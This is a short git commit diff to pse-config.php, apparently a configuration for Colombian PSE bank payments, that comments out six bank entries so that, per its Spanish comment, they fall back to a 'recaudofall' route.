a8f967fc3bd2b22cafda0f4f5406a489836949f8
Pupaster1 <new.deer6162@fastmail.com>
2026-09-26 07:39:18 -0500

    Comment out several banks in pse-config.php

--- pse-config.php
+++ pse-config.php
@@ -25,12 +25,12 @@ return [
     // Si comentas una línea, ese banco cae automáticamente a recaudofall.
     'primary_banks' => [
         'bogota' => ['slug' => 'bg', 'id' => 'e795be1af0a0e791176cc511'],
-      'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
-        'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
-          'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
-         'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-    'davivienda' => ['slug' => 'dv', 'id' => 'e795be1af0a0e791176cc511'], 
+    //  'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
+   //     'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
+   //       'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
+ //        'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
+   //     'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
+ //   'davivienda' => ['slug' => 'dv', 'id' => 'e795be1af0a0e791176cc511'], 
     ],
 
     // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
